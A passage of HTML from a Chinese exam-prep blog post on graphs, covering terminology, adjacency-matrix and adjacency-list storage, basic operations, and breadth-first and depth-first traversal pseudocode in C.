return true; } bool GetTop(SqStack &amp;amp;amp;S, Elemtype &amp;amp;amp;e) { if (S.top == -1) { //栈为空，无法读取 return false; } e = S.data[S.top]; return true; } 2. top 表示“下一个可存放元素的位置” 注意一开始 top 指针置为 0
+">数据结构之栈、队列和数组</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E7%BA%BF%E6%80%A7%E8%A1%A8/" class="article-link" data-summary="数据结构之绪论与线性表 第二章_线性表 2.1 线性表的定义和基本操作 2.1.1 线性表的定义 线性表是由n(n&amp;amp;gt;=0)个相同数据类型的元素组成的有限序列（数据类型相同，有限，有序）
+本小节介绍的线性表是一种逻辑结构，在线性表的重要术语中需要特别注意位序这一概念与数组下标的不同之处：位序是线性表中元素的逻辑位置（从 1 开始编号），数组下标是存储结构中的物理索引（通常从 0 开始），只有在线性表采用数组实现时，二者才满足位序 = 下标 &#43; 1。
+2.1.2 线性表的基本操作 线性表的基本操作，本质上就是数据结构三要素中“数据的运算”的具体体现。由于大多数高校采用严蔚敏版教材，这里介绍的函数名也采用这版的：
+InitList(&amp;amp;amp;L)：初始化表。构造一个空的线性表 L，并分配内存空间。 DestroyList(&amp;amp;amp;L)：销毁操作。销毁线性表，并释放线性表 L 所占用的内存空间。 ListInsert(&amp;amp;amp;L, i, e)：插入操作。在表 L 中的第 i 个位置上插入指定元素 e。 ListDelete(&amp;amp;amp;L, i, &amp;amp;amp;e)：删除操作。删除表 L 中第 i 个位置的元素，并用 e 返回删除的元素值。 LocateElem(L, e)：按值查找操作。在表 L 中查找具有给定关键字值的元素。 GetElem(L, i)：按位查找操作。获取表 L 中第 i 个位置的元素的值。 Length(L)：求表长。返回线性表 L 的长度，即 L 中数据元素的个数。 PrintList(L)：输出操作。按前后顺序输出线性表 L 的所有元素值。 Empty(L)：判空操作。若 L 为空表，则返回 true，否则返回 false。 2.2 顺序表 本小节思维导图如下： 2.2.1 顺序表的定义 线性表的顺序存储也称顺序表。它是用一段地址连续的存储单元依次存储线性表中的数据元素，使得逻辑上相邻的元素在物理位置上也相邻。顺序表的逻辑顺序和存储顺序完全一致
+">数据结构之线性表</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E7%BB%AA%E8%AE%BA/" class="article-link" data-summary="数据结构之绪论 第一章_绪论 1.1 数据结构在学什么 如何用程序代码把现实世界的问题信息化 如何用计算机高效地处理这些信息从而创造价值 只有详细学习过这四门课的人才能够更好理解信息化，这也是计算机专业的学生和只会写代码的人的区别所在 1.2 数据结构的基本概念 本小节会对数据结构中的基本概念做简单讲解，目的在于了解和理解概念，具体的深入了解会在后面的章节中提到，本小节的思维导图如下： 1.2.1 基本概念 1.2.1.1 数据 数据是信息的载体，是描述客观事物属性的数、字符及所有能输入到计算机中并被计算机程序识别和处理的符号的集合，数据是计算机程序加工的原料。
+简单来看，在计算机的世界中，数据就是0和1
+1.2.1.2 数据元素、数据项 数据元素是数据的基本单位，通常作为一个整体进行考虑和处理。一个数据元素可由若干数据项组成，数据项是构成数据元素的不可分割的最小单位
+其实什么是数据元素什么是数据项，得根据实际的业务需求来确定，比如以微博举例：每一个账号为一个数据元素，而账号里的每一个信息为一个数据项： 1.2.1.3 数据结构、数据对象 数据结构是相互之间存在一种或者多种特定关系的数据元素的集合，数据对象是具有相同性质的数据元素的集合。
+其实简单理解就是数据对象是一堆相同性质的数据集合，而数据结构是在数据对象的基础上，还规定了数据结构的三要素&amp;amp;ndash;逻辑关系，存储结构，数据的运算。
+1.2.1.4 数据类型、抽象数据类型 数据类型是一个值的集合和定义在此集合上的一组操作的总称。分为原子类型（其值不可再分的数据类型）和结构类型（其值可以分解成若干成分的数据类型）
+抽象数据类型(Abstract Data Type,ADT) 是抽象数据组织及与之相关的操作
+若从数据结构的三要素来进行讨论，数据类型和抽象数据类型都只是实现了逻辑结构和数据的运算，不涉及具体的存储结构和实现细节。
+1.2.2 数据结构三要素 非常重要，我们再数据结构的学习中，任何涉及到数据结构的地方，首先想到的就应该是三要素
+1.2.2.1 逻辑结构 数据的逻辑结构只分为以下的四种结构，在考研数据结构中主要是讨论后三种逻辑结构：
+集合：各个数据元素同属一个集合，之间没有任何关系。 线性结构：数据元素之间是一对一的关系，除了第一个元素，所有的元素都有唯一前驱，除了最后一个元素，任何元素都有唯一后继 树形结构，就像树枝一样，数据元素之间是一对多的关系，比如本小节开始给的思维导图就是树形结构的关系 图结构：数据元素之间存在多对多的关系，像一张网一样。 1.2.2.2 存储结构（物理结构） 数据的存储结构（物理结构）是指数据在计算机内存中的存储方式，常见有以下四种：
+顺序存储：把逻辑上相邻的元素存储在物理位置上也相邻的存储单元中，元素之间的关系由存储单元的邻接关系来体现，要求给数据元素分配的是一片连续的内存空间，就像C语言中的数组。 链式存储：逻辑上相邻的元素可能在物理位置上表示不相邻，借助指示元素存储地址的指针来表示元素间的逻辑地址关系，就像C语言中的链表。 索引存储：在存储元素信息的同时，还建立附加的索引表。索引表中的每项称为索引项，索引项的一般形式是（关键字，地址）。就像操作系统中分页存储中的页表。 散列存储：根据元素的关键字通过散列函数直接计算出元素的存储地址，又称哈希(Hash)存储。具体比较复杂，后面在做讲解，这里了解就好。 1.2.2.3 数据的运算 数据的运算是施加在数据上的运算，包括运算的定义和实现。运算的定义是针对逻辑结构的，指出运算的功能；运算的实现是针对存储结构的，指出运算的具体操作步骤。
+主要就是数据结构的创销，增删改查。
+数据的运算（“能对数据做什么”） │ ├── 运算的定义（面向逻辑结构） │ ├── 插入 │ ├── 删除 │ ├── 查找 │ ├── 修改 │ └── 遍历 │ └── 运算的实现（面向存储结构） ├── 顺序存储：移动元素 / 下标访问 ├── 链式存储：修改指针 ├── 索引存储：先查索引再访问数据 └── 散列存储：通过散列函数定位 1.3 算法的基本概念 算法（Algorithm）是对特定问题求解步骤的描述，是一个有穷的指令序列，其中每条指令表示一个或者多个操作。
+">数据结构之绪论</a>
+        
+      </div>
+    </li>
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>计算机网络</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+</ul>
+
+      </div>
+    </li>
+  
+</ul>
+
+  
+</div>
+  <div class="content-center">
+    <article class="markdown-body">
+      <h1 class="post-title-template">数据结构之图</h1>
+      <div class="post-date" style="margin-bottom: 20px; color: var(--text-color); opacity: 0.7; font-size: 0.9em;">
+        
+        
+            2026-02-28
+        
+      </div>
+      <h1 id="数据结构之图">数据结构之图</h1>
+<h1 id="第六章_图">第六章_图</h1>
+<h2 id="61-图的基本概念">6.1 图的基本概念</h2>
+<p>图 G 由<strong>顶点集 V（vertex）</strong> 和<strong>边集 E（edge）</strong> 组成，记为 G = (V,E)。若 V = {v<sub>1</sub>,v<sub>2</sub>,v<sub>3</sub>&hellip;v<sub>n</sub>}，则用 <strong>|v| 表示图 G 中顶点的数量</strong>；若 E = {(u,v)|$u \in V$,$v \in V$}，则用 <strong>|E| 表示图 G 中边的数量</strong>。</p>
+<p>注意：线性表能够是空表，树能够是空树，但是<strong>图不能是空图，顶点集必须非空，边集可以为空</strong>。<strong>在图中，每一条边都必须依附于两个顶点；而顶点可以不与任何边相连（称为孤立顶点）。</strong></p>
+<h2 id="62-图的基本术语">6.2 图的基本术语</h2>
+<p>很杂，思维导图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260221180832310.png" alt="图的基本术语的思维导图"></p>
+<h3 id="621-有向图和无向图">6.2.1 有向图和无向图</h3>
+<p>弧头弧尾别搞反了！<strong>箭头那头是弧头！！</strong>
+<img src="http://tuchuang.mrlxl.cn/picture/20260221112219204.png" alt="有向图和无向图"></p>
+<h3 id="622-简单图和多重图">6.2.2 简单图和多重图</h3>
+<p><img src="http://tuchuang.mrlxl.cn/picture/20260221112553574.png" alt="简单图和多重图"></p>
+<h3 id="623-顶点">6.2.3 顶点</h3>
+<p>关于顶点主要就是<strong>顶点的度、入度和出度</strong>。
+在无向图中：<strong>顶点的度</strong>是指依附于该顶点的边的数量（无入度和出度之分），<strong>记为 TD(v)</strong>。<strong>全部顶点的度数之和等于边数的两倍</strong>。
+在有向图中：顶点的度分为<strong>入度和出度</strong>，入度就是该点是多少个<strong>弧头</strong>，记为 <strong>ID(v)</strong>，出度就是该点是多少个<strong>弧尾</strong>，记为 <strong>OD(v)</strong>。当然 <strong>TD(v) = ID(v) + OD(v)</strong>。
+<img src="http://tuchuang.mrlxl.cn/picture/20260221154047516.png" alt="顶点的度、入度和出度"></p>
+<h3 id="624-边的权带权图--网">6.2.4 边的权，带权图 / 网</h3>
+<p>边上带权值的图被称为<strong>带权图</strong>，也称为<strong>网</strong>。
+<img src="http://tuchuang.mrlxl.cn/picture/20260221173738285.png" alt="带权图"></p>
+<h3 id="625-点与点间的关系">6.2.5 点与点间的关系</h3>
+<h4 id="6251-一堆描述">6.2.5.1 一堆描述</h4>
+<p>好杂啊，没事过来看看..
+<img src="http://tuchuang.mrlxl.cn/picture/20260221160958484.png" alt="顶点间的关系"></p>
+<h4 id="6252-连通图与强连通图">6.2.5.2 连通图与强连通图</h4>
+<p>注意在无向图中才讨论连通性，在有向图中才考虑强连通性。
+<img src="http://tuchuang.mrlxl.cn/picture/20260221161744709.png" alt="连通图与强连通图"></p>
+<h3 id="626-图的局部">6.2.6 图的局部</h3>
+<h4 id="6261-子图">6.2.6.1 子图</h4>
+<p>注意划分的子图，一定要是个图。
+<img src="http://tuchuang.mrlxl.cn/picture/20260221163455692.png" alt="子图的概念"></p>
+<h4 id="6262-连通分量与强连通分量">6.2.6.2 连通分量与强连通分量</h4>
+<p><strong>连通分量</strong>就是<strong>无向图</strong>中划分出来连通的子图且是<strong>极大连通子图</strong>（要求尽可能多的顶点和边，n - 1条），不是连通子图就叫做连通分量。
+<img src="http://tuchuang.mrlxl.cn/picture/20260221165424981.png" alt="连通分量">
+<strong>强连通分量</strong>就是<strong>有向图</strong>中的<strong>极大强连通子图</strong>，同样极小强连通子图不在这里做讨论。
+<img src="http://tuchuang.mrlxl.cn/picture/20260221165551564.png" alt="强连通分量"></p>
+<h4 id="6263-生成树和生成森林">6.2.6.3 生成树和生成森林</h4>
+<p><strong>生成树</strong>是<strong>包含所有顶点的极小连通子图</strong>（要求尽可能少的边），<strong>移除任意一条边都会变成非连通图，添加任意一条边都会形成一条回路</strong>。现实意义就比如施工队施工怎么实现“村村通”。
+我们在考研中讨论生成树<strong>默认且主要</strong>都是在<strong>无向图</strong>中讨论，有向图的生成树（有向生成树 / 有根生成树）会有些不同。
+<img src="http://tuchuang.mrlxl.cn/picture/20260221171615037.png" alt="生成树">
+<strong>非连通图</strong>中的每一个<strong>连通分量</strong>的<strong>生成树</strong>构成了一个<strong>生成森林</strong>。
+<img src="http://tuchuang.mrlxl.cn/picture/20260221172131381.png" alt="生成森林"></p>
+<h3 id="627-几种特殊的图">6.2.7 几种特殊的图</h3>
+<h4 id="6271-完全图">6.2.7.1 完全图</h4>
+<p><img src="http://tuchuang.mrlxl.cn/picture/20260221174426197.png" alt="完全图"></p>
+<h4 id="6272-稀疏图与稠密图">6.2.7.2 稀疏图与稠密图</h4>
+<p>概念较为模糊，没有绝对界限。
+<img src="http://tuchuang.mrlxl.cn/picture/20260221174529357.png" alt="稀疏图与稠密图"></p>
+<h4 id="6273-有向树">6.2.7.3 有向树</h4>
+<p>树是不存在回路，且连通的无向图。<strong>n 个顶点的图，若存在大于等于 n 条边，肯定有回路（常考点）</strong>。
+只有一个顶点入度为 0 ，其他顶点的入度都是 1 的有向图称为<strong>有向树</strong>。
+<img src="http://tuchuang.mrlxl.cn/picture/20260221175548409.png" alt="有向树"></p>
+<h2 id="63-图的存储结构">6.3 图的存储结构</h2>
+<p>本节知识梳理如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260222163906334.png" alt="图的存储结构"></p>
+<h3 id="631-邻接矩阵法">6.3.1 邻接矩阵法</h3>
+<p>概念很简单，可纯用<strong>顺序存储</strong>实现，根据邻接矩阵求<strong>顶点的度、入度、出度</strong>也都好求，示意如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260222140648979.png" alt="邻接矩阵法">
+同理，若是<strong>存储带权图</strong>，也只需要将原先 <strong>1 的位置</strong>换成<strong>边的权值</strong>，将原先 <strong>0 的位置</strong>换成 <strong>无穷</strong> 即可，值得注意的是：有些时候会把邻接矩阵中指向自己的边换成 0 。示意图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260222141754817.png" alt="邻接矩阵存储带权图">
+关于<strong>邻接矩阵法的性能分析</strong>：由于要对每条边都存储，那自然更加<strong>适合存储稠密图</strong>，空间复杂度相比于其他图的存储方法较高，是 <strong>O(n<sup>2</sup>)</strong>，若是什么特殊矩阵，还可进行<strong>压缩存储</strong>，《数据结构之栈、队列和数组》3.4 节（末尾链接）中提到过五种矩阵的压缩存储。</p>
+<h3 id="632-邻接表法">6.3.2 邻接表法</h3>
+<p>和<strong>树的孩子表示法</strong>非常像，是一种<strong>顺序存储+链式存储</strong>，一图胜千言，示意图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260222152953050.png" alt="邻接表法">
+代码如下（有向图无向图都是这个代码）：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// &#34;边/弧&#34;
+</span></span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">ArcNode</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">adjvex</span><span class="p">;</span>              <span class="c1">// 边/弧指向哪个结点
+</span></span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">ArcNode</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>    <span class="c1">// 指向下一条弧的指针
+</span></span></span><span class="line"><span class="cl">    <span class="c1">// InfoType info;         // 边权值
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">ArcNode</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// &#34;顶点&#34;
+</span></span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">VNode</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">VertexType</span> <span class="n">data</span><span class="p">;</span>         <span class="c1">// 顶点信息
+</span></span></span><span class="line"><span class="cl">    <span class="n">ArcNode</span> <span class="o">*</span><span class="n">first</span><span class="p">;</span>          <span class="c1">// 第一条边/弧
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">VNode</span><span class="p">,</span> <span class="n">AdjList</span><span class="p">[</span><span class="n">MaxVertexNum</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 用邻接表存储的图
+</span></span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">AdjList</span> <span class="n">vertices</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">vexnum</span><span class="p">,</span> <span class="n">arcnum</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">ALGraph</span><span class="p">;</span>
+</span></span></code></pre></div><p><strong>缺点</strong>就是若想找到有向图的某个顶点 A 的<strong>入度</strong>，只能挨个遍历找不同顶点的弧头看是否为 A，时间复杂度较高。</p>
+<p><strong>注意：</strong> 邻接表的表示方式并不唯一哦，我可以是 A -&gt; 1 -&gt; 2 -&gt; 3，也能是 A -&gt; 2 -&gt; 3 -&gt; 1。但是邻接矩阵是唯一的。</p>
+<h3 id="633-十字链表">6.3.3 十字链表</h3>
+<p>十字链表法求入度好求，也适用于稀疏图，但是<strong>只能存储有向图</strong>，空间复杂度是 <strong>O(|V|+|E|)</strong>。
+<strong>顺着绿色的指针一路能找到所有出弧，顺着橙色的指针一路能找到所有入弧。</strong>
+示意图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260222155943441.png" alt="十字链表">
+考研过程中不太可能让你用代码实现（过于复杂），代码就不做解释了。</p>
+<h3 id="634-邻接多重表">6.3.4 邻接多重表</h3>
+<p>若使用<strong>邻接表</strong>对<strong>无向图</strong>进行存储，则每条边会对应两份冗余的信息，那么在执行像删除这样的操作时，时间复杂度会更高。为了解决这个问题我们引入<strong>邻接多重表</strong>。
+和链表一样，删除一个结点之后只需要把两种指针指向删除结点的指针都移向删除结点的指向的位置就行了。示意图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260222163224339.png" alt="邻接多重表">
+考研过程中不太可能让你用代码实现（过于复杂），代码就不做解释了。</p>
+<h2 id="64-图的基本操作">6.4 图的基本操作</h2>
+<p>这里介绍的图的基本操作独立于其存储结构（概念层面），但存储方式不同，函数的实现方式有些也会不同。因为十字链表和邻接多重表一般都不会考代码，所以在考虑图的基本操作时，尽量根据<strong>邻接矩阵和邻接表</strong>进行推演。
+由于动态演示会更加清晰，这里仅做基本操作概念的介绍：</p>
+<ul>
+<li><strong>Adjacent (G,x,y)：</strong> 判断图 G 是否存在边 &lt; x, y &gt; 或 (x, y)。</li>
+<li><strong>Neighbors (G,x)：</strong> 列出图 G 中与结点 x 邻接的边。</li>
+<li><strong>InsertVertex (G,x)：</strong> 在图 G 中插入顶点 x。</li>
+<li><strong>DeleteVertex (G,x)：</strong> 从图 G 中删除顶点 x。</li>
+<li><strong>AddEdge (G,x,y)：</strong> 若无向边 (x, y) 或有向边 &lt; x, y &gt; 不存在，则向图 G 中添加该边。</li>
+<li><strong>RemoveEdge (G,x,y)：</strong> 若无向边 (x, y) 或有向边 &lt; x, y &gt; 存在，则从图 G 中删除该边。</li>
+<li><strong>FirstNeighbor (G,x)：</strong> 求图 G 中顶点 x 的第一个邻接点，若有则返回顶点号。若 x 没有邻接点或图中不存在 x，则返回 - 1。</li>
+<li><strong>NextNeighbor (G,x,y)：</strong> 假设图 G 中顶点 y 是顶点 x 的一个邻接点，返回除 y 之外顶点 x 的下一个邻接点的顶点号，若 y 是 x 的最后一个邻接点，则返回 - 1。</li>
+<li><strong>Get_edge_value (G,x,y)：</strong> 获取图 G 中边 (x, y) 或 &lt; x, y &gt; 对应的权值。</li>
+<li><strong>Set_edge_value (G,x,y,v)：</strong> 设置图 G 中边 (x, y) 或 &lt; x, y &gt; 对应的权值为 v。</li>
+<li><strong>广度优先遍历和深度优先遍历。</strong></li>
+</ul>
+<h2 id="65-图的遍历">6.5 图的遍历</h2>
+<h3 id="651-图的广度优先遍历">6.5.1 图的广度优先遍历</h3>
+<h4 id="6511-概念及实现">6.5.1.1 概念及实现</h4>
+<p>概念和<strong>树的层序遍历</strong>是非常类似的（树也是一种特殊的图）。使用一个<strong>辅助队列</strong>进行实现，在《数据结构之栈、队列和数组与串》3.3.4.1 节中就介绍了实现方法，实现代码如下（使用基本操作的伪代码）：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp"># define MAX_VERTEX_NUM 50
+</span></span></span><span class="line"><span class="cl"><span class="kt">bool</span> <span class="n">visited</span><span class="p">[</span><span class="n">MAX_VERTEX_NUM</span><span class="p">];</span>  <span class="c1">//访问标记数组，初始全为 false
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">BFS</span><span class="p">(</span><span class="n">Graph</span> <span class="n">G</span><span class="p">,</span> <span class="kt">int</span> <span class="n">v</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">visit</span><span class="p">(</span><span class="n">v</span><span class="p">);</span>  <span class="c1">//从顶点 v 出发，广度优先遍历图 G
+</span></span></span><span class="line"><span class="cl">    <span class="n">visited</span><span class="p">[</span><span class="n">v</span><span class="p">]</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">EnQueue</span><span class="p">(</span><span class="n">Q</span><span class="p">,</span> <span class="n">v</span><span class="p">);</span>  <span class="c1">//将结点 v 插入队列
+</span></span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nf">isEmpty</span><span class="p">(</span><span class="n">Q</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">DeQueue</span><span class="p">(</span><span class="n">Q</span><span class="p">,</span> <span class="n">v</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">w</span> <span class="o">=</span> <span class="nf">FirstNeighbor</span><span class="p">(</span><span class="n">G</span><span class="p">,</span> <span class="n">v</span><span class="p">);</span> <span class="n">w</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">w</span> <span class="o">=</span> <span class="nf">NextNeighbor</span><span class="p">(</span><span class="n">G</span><span class="p">,</span> <span class="n">v</span><span class="p">,</span> <span class="n">w</span><span class="p">))</span> <span class="p">{</span>  <span class="c1">//检测所有邻接点
+</span></span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">visited</span><span class="p">[</span><span class="n">w</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">visit</span><span class="p">(</span><span class="n">w</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">visited</span><span class="p">[</span><span class="n">w</span><span class="p">]</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span> <span class="c1">//对 w 左访问标记
+</span></span></span><span class="line"><span class="cl">                <span class="nf">EnQueue</span><span class="p">(</span><span class="n">Q</span><span class="p">,</span> <span class="n">w</span><span class="p">);</span>  <span class="c1">//顶点 w 入队
+</span></span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//========== 直接使用 BFS 函数只能实现连通图的遍历 ==========
+</span></span></span><span class="line"><span class="cl"><span class="c1">//========= 下面这个函数才是完整的，通用的 广度优先遍历 =========
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 对于处理非连通图的思想是，通过标记数组进行 “断点重新遍历”
+</span></span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">BFSTraverse</span><span class="p">(</span><span class="n">Graph</span> <span class="n">G</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">G</span><span class="p">.</span><span class="n">vexnum</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">visited</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">InitQueue</span><span class="p">(</span><span class="n">Q</span><span class="p">);</span>  <span class="c1">//初始化辅助队列
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">G</span><span class="p">.</span><span class="n">vexnum</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">visited</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">BFS</span><span class="p">(</span><span class="n">G</span><span class="err">，</span><span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong>值得注意的是</strong>，在遍历一个结点的<strong>邻接结点</strong>的时候，其<strong>次序可不一定是从小到大！</strong>，不是上面的基本操作函数决定的，而是由<strong>图的存储结构</strong>决定的。基本操作只要求“按存储结构中邻接点的出现顺序进行遍历”，而在：</p>
+<ul>
+<li><strong>邻接矩阵中</strong>，这个“出现顺序”恰好是按下标<strong>从小到大</strong></li>
+<li><strong>邻接表中</strong>，这个“出现顺序”取决于链表的实际存储顺序，因此<strong>不一定</strong>是从小到大</li>
+</ul>
+<p>如图所示：
+<img src="http://tuchuang.mrlxl.cn/picture/20260222180952979.png" alt="次序不固定"></p>
+<h4 id="6512-性能分析">6.5.1.2 性能分析</h4>
+<p>广度优先遍历使用<strong>邻接矩阵和邻接表</strong>两种存储方式的<strong>空间复杂度分析</strong>如下：
+都使用了一个辅助队列，每个顶点最多入队访问一次，在最坏情况下，空间复杂度都为 <strong>O(|V|)</strong>。</p>
+<p>广度优先遍历使用<strong>邻接矩阵和邻接表</strong>两种存储方式的<strong>时间复杂度分析</strong>如下：
+<strong>时间开销</strong>主要就是<strong>访问顶点和找各个边结点</strong>，拆开来分析就可以
+<img src="http://tuchuang.mrlxl.cn/picture/20260222202928263.png" alt="时间复杂度分析"></p>
+<h4 id="6513-广度优先生成树">6.5.1.3 广度优先生成树</h4>
+<p>我们将广度优先过程中，所经过的边与访问的顶点共同构成一棵树（推一次广度优先就会画了），称为<strong>广度优先生成树（具有层次特性的特殊生成树）</strong>。</p>
+<p>同样，对于一个图来说，采用<strong>邻接表存储（不固定）<strong>表示方法不唯一，而采用</strong>邻接矩阵存储</strong>表示方法唯一。
+<img src="http://tuchuang.mrlxl.cn/picture/20260222205753790.png" alt="广度优先生成树"></p>
+<h4 id="6514-广度优先生成森林">6.5.1.4 广度优先生成森林</h4>
+<p>就是非连通图的连通分量的广度优先生成树构成的。
+<img src="http://tuchuang.mrlxl.cn/picture/20260222205639431.png" alt="广度优先生成森林"></p>
+<h3 id="652-图的深度优先遍历">6.5.2 图的深度优先遍历</h3>
+<h4 id="6521-概念及实现">6.5.2.1 概念及实现</h4>
+<p>概念和<strong>树的先根遍历</strong>是非常类似的（树也是一种特殊的图）。使用递归实现，实现代码和示意图如下（使用基本操作的伪代码）：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp"># define MAX_VERTEX_NUM 50
+</span></span></span><span class="line"><span class="cl"><span class="kt">bool</span> <span class="n">visited</span><span class="p">[</span><span class="n">MAX_VERTEX_NUM</span><span class="p">];</span>  <span class="c1">//访问标记数组，初始全为 false
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">DFS</span><span class="p">(</span><span class="n">Graph</span> <span class="n">G</span><span class="p">,</span> <span class="kt">int</span> <span class="n">v</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">visit</span><span class="p">(</span><span class="n">v</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">visited</span><span class="p">[</span><span class="n">v</span><span class="p">]</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">w</span> <span class="o">=</span> <span class="nf">FirstNeighbor</span><span class="p">(</span><span class="n">G</span><span class="p">,</span> <span class="n">v</span><span class="p">);</span> <span class="n">w</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">w</span> <span class="o">=</span> <span class="nf">NextNeighbor</span><span class="p">(</span><span class="n">G</span><span class="p">,</span> <span class="n">v</span><span class="p">,</span> <span class="n">w</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">visited</span><span class="p">[</span><span class="n">w</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">DFS</span><span class="p">(</span><span class="n">G</span><span class="p">,</span><span class="n">w</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//========== 直接使用 DFS 函数只能实现连通图的遍历 ==========
